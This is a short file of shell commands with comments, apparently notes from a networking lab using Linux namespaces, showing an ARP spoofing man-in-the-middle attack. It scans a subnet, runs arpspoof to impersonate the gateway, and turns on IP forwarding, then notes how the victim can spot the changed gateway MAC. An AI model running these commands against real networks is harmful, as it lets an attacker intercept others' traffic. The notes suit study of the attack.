# saying to other that i am the router, so they will send the packet to me
# it replaces the MAC of the router with mine 
# the attacker needs to be connected to the same switch of the victim
arpscan 10.0.0.0/24
sudo ip netns exec H1 arpspoof -i veth0 -t 10.0.0.1 -r 10.0.0.254
sudo ip netns exec H1 sysctl -w net.ipv4.ip_forward=1

# but it's not stealth, the host will know that the MAC of the router is changed
# looking at the ping output or the routing table, we can see that the MAC of the gateway is not that of the router